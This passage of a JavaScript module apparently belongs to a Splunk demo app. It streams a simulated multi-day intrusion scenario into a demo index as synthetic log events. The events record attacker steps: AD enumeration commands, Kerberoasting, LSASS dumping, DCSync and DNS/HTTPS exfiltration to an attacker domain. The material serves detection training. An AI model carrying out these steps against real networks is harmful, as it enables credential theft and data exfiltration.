                        { _time_offset: 172800, host: 'WS-MROSS', sourcetype: 'stream:http', src_ip: '10.5.2.30', src: '10.5.2.30', dest_ip: '45.131.0.77', dest: '45.131.0.77', dest_port: 443, dest_host: 'apt29-cdn-sync.com', site: 'apt29-cdn-sync.com', http_method: 'POST', url: 'https://apt29-cdn-sync.com/telemetry', uri_path: '/telemetry', bytes_out: 510, bytes_in: 2048, bytes: 2558, status: 200, app: 'https', mitre_technique: 'T1071.001', mitre_tactic: 'Command and Control', severity: 'medium', description: 'Day 2 beacon — operators issue first tasking', kill_chain_phase: 'c2', risk_score: 55, scenario_id: 'op_stillwater' }
                    ]
                },
                {
                    id: 'discovery',
                    label: 'Discovery',
                    delay: 3,
                    transition_text: 'Days 3-5 — careful reconnaissance. No noise, no rush.',
                    events: [
                        { _time_offset: 259200, host: 'WS-MROSS', sourcetype: 'WinEventLog:Sysmon', EventCode: 1, src_user: 'mross', user: 'mross', process: 'whoami.exe', process_name: 'whoami.exe', parent_process: 'rundll32.exe', parent_process_name: 'rundll32.exe', command_line: 'whoami /groups', mitre_technique: 'T1033', mitre_tactic: 'Discovery', severity: 'low', description: 'Day 3 — user/group context discovery', kill_chain_phase: 'discovery', risk_score: 30, scenario_id: 'op_stillwater' },
                        { _time_offset: 270000, host: 'WS-MROSS', sourcetype: 'WinEventLog:Sysmon', EventCode: 1, src_user: 'mross', user: 'mross', process: 'powershell.exe', process_name: 'powershell.exe', parent_process: 'rundll32.exe', parent_process_name: 'rundll32.exe', command_line: 'powershell -c "Get-ADComputer -Filter * -Properties OperatingSystem | Select Name,OperatingSystem"', mitre_technique: 'T1018', mitre_tactic: 'Discovery', severity: 'medium', description: 'Remote-system discovery via AD (LDAP enumeration)', kill_chain_phase: 'discovery', risk_score: 50, scenario_id: 'op_stillwater' },
                        { _time_offset: 432000, host: 'WS-MROSS', sourcetype: 'WinEventLog:Sysmon', EventCode: 1, src_user: 'mross', user: 'mross', process: 'powershell.exe', process_name: 'powershell.exe', parent_process: 'rundll32.exe', parent_process_name: 'rundll32.exe', command_line: 'powershell -enc <SharpHound collection>', mitre_technique: 'T1069.002', mitre_tactic: 'Discovery', severity: 'high', description: 'Day 5 — BloodHound/SharpHound AD attack-path collection', kill_chain_phase: 'discovery', risk_score: 65, scenario_id: 'op_stillwater' }
                    ]
                },
                {
                    id: 'credential_access',
                    label: 'Credential Access',
                    delay: 3,
                    transition_text: 'Days 6-8 — harvesting credentials. Kerberoast and LSASS.',
                    events: [
                        { _time_offset: 518400, host: 'WS-MROSS', sourcetype: 'WinEventLog:Security', EventCode: 4769, src_user: 'mross', user: 'mross', service_name: 'MSSQLSvc/srv-sql01.corp.local:1433', mitre_technique: 'T1558.003', mitre_tactic: 'Credential Access', severity: 'high', description: 'Day 6 — Kerberoasting: TGS requested for SQL service account', kill_chain_phase: 'credential_access', risk_score: 70, scenario_id: 'op_stillwater' },
                        { _time_offset: 525600, host: 'WS-MROSS', sourcetype: 'WinEventLog:Sysmon', EventCode: 10, src_user: 'mross', user: 'mross', process: 'rundll32.exe', process_name: 'rundll32.exe', target_process: 'C:\\Windows\\System32\\lsass.exe', granted_access: '0x1410', mitre_technique: 'T1003.001', mitre_tactic: 'Credential Access', severity: 'critical', description: 'LSASS memory access (credential dumping) by implant', kill_chain_phase: 'credential_access', risk_score: 90, scenario_id: 'op_stillwater' },
                        { _time_offset: 691200, host: 'WS-MROSS', sourcetype: 'attack_sim:notable', src_user: 'mross', user: 'mross', mitre_technique: 'T1003.001', mitre_tactic: 'Credential Access', severity: 'critical', description: 'NOTABLE: Credential theft on WS-MROSS — service + cached domain creds harvested', kill_chain_phase: 'credential_access', risk_score: 90, scenario_id: 'op_stillwater' }
                    ]
                },
                {
                    id: 'lateral_movement',
                    label: 'Lateral Movement',
                    delay: 3,
                    transition_text: 'Days 9-13 — pivoting deeper. File server, SQL, then the DC.',
                    events: [
                        { _time_offset: 777600, host: 'SRV-FILE02', sourcetype: 'WinEventLog:Security', EventCode: 4624, src_ip: '10.5.2.30', src: '10.5.2.30', dest_ip: '10.5.10.22', dest: 'SRV-FILE02', src_user: 'svc_sql', user: 'svc_sql', logon_type: 3, action: 'success', mitre_technique: 'T1021.002', mitre_tactic: 'Lateral Movement', severity: 'high', description: 'Day 9 — lateral move to SRV-FILE02 using cracked svc_sql credential (SMB)', kill_chain_phase: 'lateral_movement', risk_score: 75, scenario_id: 'op_stillwater' },
                        { _time_offset: 864000, host: 'SRV-SQL01', sourcetype: 'WinEventLog:Security', EventCode: 4624, src_ip: '10.5.2.30', src: '10.5.2.30', dest_ip: '10.5.10.42', dest: 'SRV-SQL01', src_user: 'svc_sql', user: 'svc_sql', logon_type: 3, action: 'success', mitre_technique: 'T1021.002', mitre_tactic: 'Lateral Movement', severity: 'high', description: 'Day 10 — lateral move to SQL server SRV-SQL01', kill_chain_phase: 'lateral_movement', risk_score: 78, scenario_id: 'op_stillwater' },
                        { _time_offset: 1123200, host: 'DC01', sourcetype: 'WinEventLog:Security', EventCode: 4662, src_ip: '10.5.2.30', src: '10.5.2.30', dest_ip: '10.5.10.10', dest: 'DC01', src_user: 'svc_sql', user: 'svc_sql', object_type: 'DS-Replication-Get-Changes-All', mitre_technique: 'T1003.006', mitre_tactic: 'Credential Access', severity: 'critical', description: 'Day 13 — DCSync against DC01 (directory replication by non-DC account)', kill_chain_phase: 'credential_access', risk_score: 95, scenario_id: 'op_stillwater' }
                    ]
                },
                {
                    id: 'collection',
                    label: 'Collection',
                    delay: 3,
                    transition_text: 'Days 15-18 — quietly staging the prize.',
                    events: [
                        { _time_offset: 1296000, host: 'SRV-FILE02', sourcetype: 'WinEventLog:Sysmon', EventCode: 11, src_user: 'svc_sql', user: 'svc_sql', process: 'cmd.exe', process_name: 'cmd.exe', target_filename: 'C:\\Windows\\Temp\\eng_designs.7z', file_name: 'eng_designs.7z', file_path: 'C:\\Windows\\Temp', mitre_technique: 'T1560.001', mitre_tactic: 'Collection', severity: 'high', description: 'Day 15 — engineering design docs archived into eng_designs.7z', kill_chain_phase: 'collection', risk_score: 75, scenario_id: 'op_stillwater' },
                        { _time_offset: 1350000, host: 'SRV-SQL01', sourcetype: 'stream:mysql', src_ip: '10.5.2.30', src: '10.5.2.30', dest_ip: '10.5.10.42', dest: '10.5.10.42', dest_port: 1433, src_user: 'svc_sql', user: 'svc_sql', query: 'SELECT * FROM contracts.dbo.supplier_terms', database: 'contracts', bytes_out: 256, bytes_in: 18874368, bytes: 18874624, app: 'mssql', mitre_technique: 'T1005', mitre_tactic: 'Collection', severity: 'high', description: '18 MB pulled from contracts database', kill_chain_phase: 'collection', risk_score: 78, scenario_id: 'op_stillwater' },
                        { _time_offset: 1468800, host: 'SRV-FILE02', sourcetype: 'WinEventLog:Sysmon', EventCode: 11, src_user: 'svc_sql', user: 'svc_sql', process: 'cmd.exe', process_name: 'cmd.exe', target_filename: 'C:\\Windows\\Temp\\finance_q.7z', file_name: 'finance_q.7z', file_path: 'C:\\Windows\\Temp', mitre_technique: 'T1560.001', mitre_tactic: 'Collection', severity: 'high', description: 'Day 17 — finance records archived for exfil', kill_chain_phase: 'collection', risk_score: 78, scenario_id: 'op_stillwater' }
                    ]
                },
                {
                    id: 'exfiltration',
                    label: 'Exfiltration',
                    delay: 3,
                    transition_text: 'Days 19-21 — low and slow, the data leaves a trickle at a time.',
                    events: [
                        { _time_offset: 1641600, host: 'SRV-FILE02', sourcetype: 'stream:dns', src_ip: '10.5.10.22', src: '10.5.10.22', dest_ip: '45.131.0.77', dest: '45.131.0.77', dest_port: 53, app: 'dns', query: 'a7f3e.chunk.apt29-cdn-sync.com', bytes_out: 220, bytes_in: 96, bytes: 316, mitre_technique: 'T1048.001', mitre_tactic: 'Exfiltration', severity: 'high', description: 'Day 19 — DNS-tunnel exfil begins (encoded chunks over TXT)', kill_chain_phase: 'exfiltration', risk_score: 80, scenario_id: 'op_stillwater' },
                        { _time_offset: 1728000, host: 'SRV-FILE02', sourcetype: 'stream:http', src_ip: '10.5.10.22', src: '10.5.10.22', dest_ip: '45.131.0.77', dest: '45.131.0.77', dest_port: 443, dest_host: 'apt29-cdn-sync.com', site: 'apt29-cdn-sync.com', http_method: 'POST', url: 'https://apt29-cdn-sync.com/upload', uri_path: '/upload', bytes_out: 8388608, bytes_in: 256, bytes: 8388864, status: 200, app: 'https', mitre_technique: 'T1041', mitre_tactic: 'Exfiltration', severity: 'critical', description: 'Day 20 — staged archives exfiltrated over HTTPS (8 MB tranche)', kill_chain_phase: 'exfiltration', risk_score: 90, scenario_id: 'op_stillwater' },
                        { _time_offset: 1814400, host: 'SRV-FILE02', sourcetype: 'attack_sim:notable', src_user: 'svc_sql', user: 'svc_sql', mitre_technique: 'T1041', mitre_tactic: 'Exfiltration', severity: 'critical', description: 'NOTABLE: Day 21 — ~210 MB of engineering & finance data exfiltrated over 21-day campaign', kill_chain_phase: 'exfiltration', risk_score: 96, scenario_id: 'op_stillwater' }
                    ]
                }
            ]
        }
    };

    // ========================================================================
    // STREAMING - groups events by sourcetype within each phase so `| collect`
    // can preserve the native sourcetype (lets eventtypes.conf + tags.conf
    // map events into CIM data models correctly)
    // ========================================================================

    function escapeSplString(s) {
        return String(s).replace(/\\/g, '\\\\').replace(/"/g, '\\"');
    }

    function buildSPLForGroup(events, sourcetype, baseTime) {
        // Builds: | makeresults count=N | streamstats count as idx | eval ... | collect index=sa_attack_sim sourcetype=<sourcetype>
        // All events in `events` share the same `sourcetype` value already.
        var spl = '| makeresults count=' + events.length + ' \n';
        spl += '| streamstats count as event_idx \n';
        spl += '| eval event_idx = event_idx - 1 \n';

        // _time per event
        spl += '| eval _time = case(';
        events.forEach(function(evt, i) {
            var t = Math.floor(baseTime / 1000) + Math.round((evt._time_offset || 0) * _indexCompress);
            spl += 'event_idx=' + i + ',' + t;
            if (i < events.length - 1) spl += ',';
        });
        spl += ') \n';

        // Collect distinct field names across events (excluding _time_offset and sourcetype)
        var fields = {};
        events.forEach(function(evt, i) {
            Object.keys(evt).forEach(function(key) {
                if (key === '_time_offset' || key === 'sourcetype') return;
                if (!fields[key]) fields[key] = {};
                fields[key][i] = evt[key];
            });
        });

        // Emit each field as a case() expression
        Object.keys(fields).forEach(function(field) {
            var vals = fields[field];
            var cases = [];
            Object.keys(vals).forEach(function(idx) {
                var val = vals[idx];
                if (typeof val === 'number') {
                    cases.push('event_idx=' + idx + ',' + val);
                } else {
                    cases.push('event_idx=' + idx + ',"' + escapeSplString(val) + '"');
                }
            });
            spl += '| eval ' + field + ' = case(' + cases.join(',') + ') \n';
        });

        spl += '| fields - event_idx \n';
        // CRITICAL: preserve the native sourcetype at index time
        spl += '| collect index=' + DEMO_INDEX + ' sourcetype="' + escapeSplString(sourcetype) + '" \n';

        return spl;
    }

    function groupEventsBySourcetype(events) {
        var groups = {};
        events.forEach(function(evt) {
            var st = evt.sourcetype || 'attack_sim:events';
            if (!groups[st]) groups[st] = [];
            groups[st].push(evt);
        });
        return groups;
    }

    // ------------------------------------------------------------------------
    // Index validation / autocreate -- same UX as the old single-scenario impl
    // ------------------------------------------------------------------------
    function createIndex(callback) {
        try {
            service.request(
                '/services/data/indexes',
                'POST',
                null,
                null,
                JSON.stringify({ name: DEMO_INDEX, datatype: 'event', maxTotalDataSizeMB: 500 }),
                { 'Content-Type': 'application/x-www-form-urlencoded' },
                function(err) {
                    if (err) {
                        $.ajax({
                            url: ((typeof $C !== 'undefined' && $C['SPLUNKD_PATH']) || '/en-US/splunkd/__raw') + '/services/data/indexes',
                            method: 'POST',
                            data: { name: DEMO_INDEX, datatype: 'event', maxTotalDataSizeMB: 500 },
                            success: function() { callback(true); },
                            error: function() { callback(false); }
                        });
                    } else {
                        callback(true);
                    }
                }
            );
        } catch(e) {
            callback(false);
        }
    }

    function validateIndex(callback) {
        try {
            service.search(
                '| rest /services/data/indexes/' + DEMO_INDEX + ' | fields title',
                { earliest_time: '-1m', latest_time: 'now' },
                function(err, job) {
                    if (err) {
                        createIndex(function(created) {
                            if (created) { callback(true, null); }
                            else { callback(false, 'Index "' + DEMO_INDEX + '" not found and could not be auto-created.'); }
                        });
                        return;
                    }
                    job.track({}, {
                        done: function(job) {
                            job.results({}, function(err, results) {
                                if (err || !results || !results.rows || results.rows.length === 0) {
                                    createIndex(function(created) {
                                        if (created) { callback(true, null); }
                                        else { callback(false, 'Index "' + DEMO_INDEX + '" not found.'); }
                                    });
                                } else {
                                    callback(true, null);
                                }
                            });
                        },
                        failed: function() { callback(false, 'Failed to validate index "' + DEMO_INDEX + '".'); }
                    });
                }
            );
        } catch(e) {
            callback(false, 'Error checking index: ' + e.message);
        }
    }

    // ------------------------------------------------------------------------
    // Per-phase streamer
    // ------------------------------------------------------------------------
    function streamPhase(phase, baseTime, state, onPhaseGroupDone, onPhaseError) {
        var groups = groupEventsBySourcetype(phase.events);
        var sourcetypes = Object.keys(groups);
        var remaining = sourcetypes.length;
        var failedAny = false;

        if (remaining === 0) {
            onPhaseGroupDone();
            return;
        }

        sourcetypes.forEach(function(st) {
            if (!state.isStreaming) return;
            var spl = buildSPLForGroup(groups[st], st, baseTime);

            service.search(
                spl,
                { earliest_time: '-24h', latest_time: 'now' },
                function(err, job) {
                    if (err) {
                        failedAny = true;
                        remaining--;
                        if (onPhaseError) onPhaseError(err, st);
                        if (remaining === 0) onPhaseGroupDone(failedAny);
                        return;
                    }
                    state._activeJobs.push(job);
                    job.track({}, {
                        done: function(job) {
                            var idx = state._activeJobs.indexOf(job);
                            if (idx > -1) state._activeJobs.splice(idx, 1);
                            remaining--;
                            if (remaining === 0) onPhaseGroupDone(failedAny);
                        },
                        failed: function(job) {
                            var idx = state._activeJobs.indexOf(job);
                            if (idx > -1) state._activeJobs.splice(idx, 1);
                            failedAny = true;
                            if (onPhaseError) onPhaseError('search failed', st);
                            remaining--;
                            if (remaining === 0) onPhaseGroupDone(failedAny);
                        }
                    });
                }
            );
        });
    }

    // ========================================================================
    // PUBLIC API
    // ========================================================================

    var DemoStreamer = {
        isStreaming: false,
        currentPhase: 0,
        totalPhases: 0,
        totalEvents: 0,
        streamedEvents: 0,
        currentScenarioId: null,
        _activeJobs: [],
        _pendingTimeouts: [],
        callbacks: {},

        getTotalEvents: function(scenarioId) {
            var s = scenarios[scenarioId];
            if (!s) return 0;
            var total = 0;
            s.phases.forEach(function(p) { total += p.events.length; });
            return total;
        },

        getScenarioInfo: function(scenarioId) {
            var s = scenarios[scenarioId];
            if (!s) return null;

            var hosts = {};
            var maxOffset = 0;
            s.phases.forEach(function(phase) {
                phase.events.forEach(function(evt) {
                    if (evt.host) hosts[evt.host] = true;
                    if (evt._time_offset && evt._time_offset > maxOffset) maxOffset = evt._time_offset;
                });
            });
            var uniqueHosts = Object.keys(hosts);
            var durationMinutes = Math.round(maxOffset / 60);

            return {
                id: s.id,
                name: s.name,
                subtitle: s.subtitle,
                description: s.description,
                duration_label: s.duration_label,
                real_world: s.real_world,
                realWorldLabel: s.real_world,
                target_playback_seconds: s.target_playback_seconds,
                totalPhases: s.phases.length,
                totalEvents: this.getTotalEvents(scenarioId),
                uniqueHosts: uniqueHosts,
                hostCount: uniqueHosts.length,
                durationMinutes: durationMinutes,
                durationLabel: s.duration_label || (durationMinutes >= 60
                    ? '~' + Math.round(durationMinutes / 60) + 'hr'
                    : '~' + durationMinutes + 'min')
            };
        },

        listScenarios: function() {
            var self = this;
            return Object.keys(scenarios).map(function(k) {
                return self.getScenarioInfo(k);
            });
        },

        getScenario: function(id) {
            return scenarios[id];
        },

        createIndex: createIndex,
        validateIndex: validateIndex,

        clearDemoData: function(callback) {
            try {
                service.search(
                    'search index=' + DEMO_INDEX + ' | delete',
                    { earliest_time: '-24h', latest_time: 'now' },
                    function(err, job) {
                        if (err) {
                            if (callback) callback(null);
                            return;
                        }
                        job.track({}, {
                            done: function() { if (callback) callback(null); },
                            failed: function() { if (callback) callback(null); }
                        });
                    }
                );
            } catch(e) {
                if (callback) callback(null);
            }
        },

        // Phase 4 enhancement: explicit clearScenarioData -- semantics identical
        // to clearDemoData but the name communicates what it does for the UI.
        clearScenarioData: function(onComplete, onError) {
            this.clearDemoData(function(err) {
                if (err && onError) onError(err);
                else if (onComplete) onComplete();
            });
        },

        // ====================================================================
        // streamScenario(scenarioId, callbacks)
        //   callbacks: { onPhaseStart, onPhaseComplete, onProgress,
        //                onComplete, onError }
        // ====================================================================
        streamScenario: function(scenarioId, callbacks) {
            if (this.isStreaming) return false;

            var s = scenarios[scenarioId];
            if (!s) {
                if (callbacks && callbacks.onError) callbacks.onError('Unknown scenario: ' + scenarioId, -1);
                return false;
            }

            this.callbacks = callbacks || {};
            this.isStreaming = true;
            this.currentScenarioId = scenarioId;
            this.currentPhase = 0;
            this.totalPhases = s.phases.length;
            this.totalEvents = this.getTotalEvents(scenarioId);
            this.streamedEvents = 0;
            this._activeJobs = [];
            this._pendingTimeouts = [];

            // Anchor events to ~1 hour ago so the default time picker shows them.
            var maxOffset = 0;
            s.phases.forEach(function(p) { p.events.forEach(function(e) { if (e._time_offset > maxOffset) maxOffset = e._time_offset; }); });
            // Long scenarios compress their INDEXED copy into index_span_seconds
            // (so the -24h panels populate); short ones index 1:1 with real time.
            var indexSpan = (s.index_span_seconds && maxOffset > s.index_span_seconds)
                ? s.index_span_seconds : Math.max(maxOffset, 600);
            _indexCompress = (maxOffset > 0) ? (indexSpan / maxOffset) : 1;
            var baseTime = Date.now() - (indexSpan + 100) * 1000;

            var self = this;

            validateIndex(function(valid, errorMsg) {
                if (!valid) {
                    self.isStreaming = false;
                    if (self.callbacks.onError) self.callbacks.onError(errorMsg, -1);
                    return;
                }
                self._beginStreaming(s, baseTime);
            });
            return true;
        },

        // Backwards-compatibility -- older code calls .start({...callbacks...})
        // and gets op_midnight_eclipse by default.
        start: function(callbacks) {
            return this.streamScenario('op_midnight_eclipse', callbacks);
        },

        _beginStreaming: function(scenario, baseTime) {
            var self = this;

            function runPhase(phaseIndex) {
                if (!self.isStreaming) return;

                if (phaseIndex >= scenario.phases.length) {
                    self.isStreaming = false;
                    if (self.callbacks.onComplete) {
                        self.callbacks.onComplete({
                            totalEvents: self.streamedEvents,
                            scenarioId: scenario.id,
                            scenarioName: scenario.name
                        });
                    }
                    // v1.8.0 — seed the summary index in sync with the raw data
                    // just streamed, so the summary-index-backed panels
                    // (ar_kpi_from_summary) show real rollup data immediately and
                    // coherently. Runs in the background after onComplete.
                    self._seedSummary();
                    return;
                }

                var phase = scenario.phases[phaseIndex];
                self.currentPhase = phaseIndex;

                if (self.callbacks.onPhaseStart) {
                    self.callbacks.onPhaseStart({
                        phaseIndex: phaseIndex,
                        phaseId: phase.id,
                        phaseLabel: phase.label,
                        transitionText: phase.transition_text,
                        totalPhases: scenario.phases.length,
                        eventCount: phase.events.length,
                        firstEvent: phase.events[0]
                    });
                }

                streamPhase(
                    phase,
                    baseTime,
                    self,
                    function(failedAny) {
                        self.streamedEvents += phase.events.length;
                        if (self.callbacks.onPhaseComplete) {
                            self.callbacks.onPhaseComplete({
                                phaseIndex: phaseIndex,
                                phaseLabel: phase.label,
                                eventsStreamed: self.streamedEvents,
                                totalEvents: self.totalEvents,
                                failed: !!failedAny
                            });
                        }
                        if (self.callbacks.onProgress) {
                            self.callbacks.onProgress(self.streamedEvents / self.totalEvents, phase, phaseIndex, scenario.phases.length);
                        }
                        scheduleNext(phaseIndex);
                    },
                    function(err, sourcetype) {
                        if (self.callbacks.onError) self.callbacks.onError('Phase ' + phaseIndex + ' / ' + sourcetype + ': ' + err, phaseIndex);
                    }
                );
            }

            function scheduleNext(currentIndex) {
                if (!self.isStreaming) return;
                var nextPhase = scenario.phases[currentIndex + 1];
                var delay = nextPhase ? (nextPhase.delay || 1) * 1000 : 0;
                if (delay > 0) {
                    var tid = setTimeout(function() {
                        var idx = self._pendingTimeouts.indexOf(tid);
                        if (idx > -1) self._pendingTimeouts.splice(idx, 1);
                        runPhase(currentIndex + 1);
                    }, delay);
                    self._pendingTimeouts.push(tid);
                } else {
                    runPhase(currentIndex + 1);
                }
            }

            if (self.callbacks.onPhaseStart) {
                self.callbacks.onPhaseStart({ phaseIndex: -1, label: 'Preparing...', phaseLabel: 'Preparing...' });
            }

            this.clearDemoData(function() {
                var tid = setTimeout(function() {
                    var idx = self._pendingTimeouts.indexOf(tid);
                    if (idx > -1) self._pendingTimeouts.splice(idx, 1);
                    runPhase(0);
                }, 500);
                self._pendingTimeouts.push(tid);
            });
        },

        // ====================================================================
        // _seedSummary() — populate summary_sa_attack_replay from the raw data
        // that was just streamed. Mirrors the sar_*_rollup saved searches but
        // as a single coherent snapshot per scenario/tactic/host so the
        // summary-index path is exercised in the demo without waiting for cron.
        // Stale rollups are deleted first so re-streaming (which wipes + refills
        // the raw index) keeps the summary index coherent rather than doubling.
        // ====================================================================
        _seedSummary: function(onDone) {
            var win = { earliest_time: '-24h', latest_time: 'now' };
            var seeds = [
                // KPI rollup — consumed by ar_kpi_from_summary
                'search index=' + DEMO_INDEX + ' '
                  + '| stats count as events, dc(orig_host) as hosts, max(risk_score) as max_risk, dc(mitre_technique) as techniques by scenario_id '
                  + '| eval _time=now() '
                  + '| collect index=' + SUMMARY_INDEX + ' sourcetype=sar:kpi_rollup',
                // Tactic rollup
                'search index=' + DEMO_INDEX + ' mitre_tactic=* '
                  + '| stats count as events, max(risk_score) as max_risk by scenario_id, mitre_tactic '
                  + '| eval _time=now() '
                  + '| collect index=' + SUMMARY_INDEX + ' sourcetype=sar:tactic_rollup',
                // Host rollup
                'search index=' + DEMO_INDEX + ' orig_host=* '
                  + '| stats count as events, max(risk_score) as peak_risk, dc(mitre_tactic) as tactic_count, latest(_time) as last_seen by scenario_id, orig_host '
                  + '| eval _time=now() '
                  + '| collect index=' + SUMMARY_INDEX + ' sourcetype=sar:host_rollup'
            ];

            function runSeeds() {
                var remaining = seeds.length;
                if (!remaining) { if (onDone) onDone(); return; }
                seeds.forEach(function(spl) {
                    try {
                        service.search(spl, win, function(err, job) {
                            if (err || !job) { remaining--; if (remaining === 0 && onDone) onDone(); return; }
                            job.track({}, {
                                done: function() { remaining--; if (remaining === 0 && onDone) onDone(); },
                                failed: function() { remaining--; if (remaining === 0 && onDone) onDone(); }
                            });
                        });
                    } catch (e) { remaining--; if (remaining === 0 && onDone) onDone(); }
                });
            }

            // Clear stale summary rollups first, then collect the fresh snapshot.
            try {
                service.search('search index=' + SUMMARY_INDEX + ' sourcetype=sar:* | delete', win, function(err, job) {
                    if (err || !job) { runSeeds(); return; }
                    job.track({}, { done: runSeeds, failed: runSeeds });
                });
            } catch (e) { runSeeds(); }
        },

        stop: function() {
            this.isStreaming = false;
            this._pendingTimeouts.forEach(function(tid) { clearTimeout(tid); });
            this._pendingTimeouts = [];
            this._activeJobs.forEach(function(job) {
                try { job.cancel(); } catch(e) {}
            });
            this._activeJobs = [];
        }
    };

    return DemoStreamer;
});
